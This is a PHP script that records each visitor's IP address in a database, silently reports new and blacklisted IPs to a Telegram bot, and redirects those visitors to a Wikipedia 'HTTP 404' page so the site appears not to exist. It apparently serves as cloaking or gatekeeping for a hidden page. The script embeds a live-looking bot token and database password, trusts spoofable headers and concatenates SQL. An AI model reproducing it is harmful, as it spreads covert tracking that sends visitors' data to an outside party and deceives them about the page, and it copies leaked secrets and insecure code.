<?php

try {
$con = new PDO(
    'mysql:host=127.0.0.1;dbname=dataset_ig',
    'malau',
    'password');
$con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

} catch(PDOException $e) {
  echo $sql . "<br>" . $e->getMessage();
}

function getip() {
    if (validip($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }

    foreach (explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]) as $ip) {
        if (validip(trim($ip))) {
            return $ip;
        }
    }

    if (validip($_SERVER["HTTP_PC_REMOTE_ADDR"])) {
        return $_SERVER["HTTP_PC_REMOTE_ADDR"];
    } elseif (validip($_SERVER["HTTP_X_FORWARDED"])) {
        return $_SERVER["HTTP_X_FORWARDED"];
    } elseif (validip($_SERVER["HTTP_FORWARDED_FOR"])) {
        return $_SERVER["HTTP_FORWARDED_FOR"];
    } elseif (validip($_SERVER["HTTP_FORWARDED"])) {
        return $_SERVER["HTTP_FORWARDED"];
    } else {
        return $_SERVER["REMOTE_ADDR"];
    }
}

function validip($ip) {
    if (!empty($ip) && ip2long($ip) != -1) {
        $reserved_ips = array(
            array('0.0.0.0', '2.255.255.255'),
            array('10.0.0.0', '10.255.255.255'),
            array('127.0.0.0', '127.255.255.255'),
            array('169.254.0.0', '169.254.255.255'),
            array('172.16.0.0', '172.31.255.255'),
            array('192.0.2.0', '192.0.2.255'),
            array('192.168.0.0', '192.168.255.255'),
            array('255.255.255.0', '255.255.255.255')
        );

        foreach ($reserved_ips as $r) {
            $min = ip2long($r[0]);
            $max = ip2long($r[1]);
            if ((ip2long($ip) >= $min) && (ip2long($ip) <= $max)) return false;
        }

        return true;
    } else {
        return false;
    }
}

function check_client($conn, $longip){
  $stmt = $conn->prepare("SELECT ipaddr FROM ipclient");
  $stmt->execute();

  $rows = $stmt->fetchAll();

  $res = false;

  foreach($rows as $row) {
      if($longip == $row['ipaddr']){
          $res = true;
          break;
      }
  }

  return $res;
}

function check_blacklist($conn, $longip){
  $stmt = $conn->prepare("SELECT ipaddr FROM ipblacklist where ipaddr = ".$longip);
  $stmt->execute();

  $rows = $stmt->fetchAll();

  $res = false;

  foreach($rows as $row) {
          $res = true;
          break;
  }

  return $res;
}

$ip = getip();
$longip = ip2long($ip);
 
if(!check_client($con, $longip)){
  echo "<h2>".$longip."</h2>";
  $stmt = $con->prepare("INSERT INTO ipclient (ipaddr) VALUES (:ipaddr)");
  $stmt->bindParam(':ipaddr', $longip);
  
   $stmt->execute();

   $id = 291134959;

  $path = "https://api.telegram.org/bot1729002504:AAE1uStDPQPf4L3xEVfk_jYHBfOcNSp3fF0/sendmessage?chat_id=".$id."&text=New Ip adress ".$ip;

  $res = file_get_contents($path, true);
  header('Location: https://en.wikipedia.org/wiki/HTTP_404');
}
else{
  echo $longip;
  if(check_blacklist($con, $longip)){
	$id = 291134959;
	$pathblock = "https://api.telegram.org/bot1729002504:AAE1uStDPQPf4L3xEVfk_jYHBfOcNSp3fF0/sendmessage?chat_id=".$id."&text=Blacklist try to access.Ip adress ".$ip;
	$res = file_get_contents($pathblock, true);
	sleep(2);
	header('Location: https://en.wikipedia.org/wiki/HTTP_404');
  }
}


?>
